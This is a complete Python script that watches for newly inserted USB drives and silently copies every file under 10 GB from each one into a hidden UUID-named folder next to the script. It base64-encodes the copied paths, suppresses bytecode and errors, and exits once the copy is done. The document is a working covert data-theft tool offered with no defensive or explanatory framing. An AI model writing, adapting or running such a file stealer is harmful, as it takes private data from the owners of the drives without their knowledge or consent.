import os, time, sys, uuid, base64, random
sys.dont_write_bytecode = True

class USBhandler:
    def __init__(self) -> None:
        self.previous_drives: list[str] = os.listdrives()
        self.copier: FileCopier = FileCopier()

    def drive_update(self) -> dict[str, bool] | None:
        current_drives: list[str] = os.listdrives()
        change: dict[str, bool] = {}

        for pDrive in self.previous_drives:
            if pDrive not in current_drives:
                change.update({pDrive : False})

        for cDrive in current_drives:
            if cDrive not in self.previous_drives:
                change.update({cDrive : True})

        self.previous_drives = current_drives
        return change

    def drive_listener(self) -> None:    
        while True:
            for drive, action in self.drive_update().items():
                if action:
                    self.copier.main(path=drive)
                    sys.exit(0)
            time.sleep(1)

class FileCopier:
    def __init__(self) -> None:
        self.save_path: str = os.path.dirname(os.path.realpath(__file__))
        self.file_paths: list[str] = []

    def drive_walk(self, path: str) -> None:
        def recursion(path: str) -> None:
            for file in os.listdir(path):
                if os.path.isdir(full_path := f"{path}/{file}"):
                    recursion(path=full_path)
                else:
                    self.file_paths.append(full_path)
        recursion(path=path)


    def save_files(self) -> None: 
        os.mkdir(full_save_path := f"{self.save_path}\\{uuid.uuid4()}\\")
        while self.file_paths:
            self.file_paths.remove(path := random.choice(self.file_paths))

            if os.path.getsize(path) < 10 * (10 ** 9):
                try:
                    with open(path, "rb") as file:
                        data: bytes = file.read()
                except Exception as error:
                    continue
                
                encoded_path: list[str] = [base64.b64encode(x.encode("utf-8")).decode("utf-8") for x in path.split("/")[1:]]
                new_path: str = full_save_path + "\\".join(encoded_path)

                os.makedirs(os.path.dirname(new_path), exist_ok=True)
                try:
                    with open(new_path, "wb") as file:
                        file.write(data)
                except:
                    sys.exit(0)

    def main(self, path: str) -> None:
        self.drive_walk(path=path)
        if self.file_paths:
            self.save_files()

if __name__ == "__main__":
    USBhandler().drive_listener()
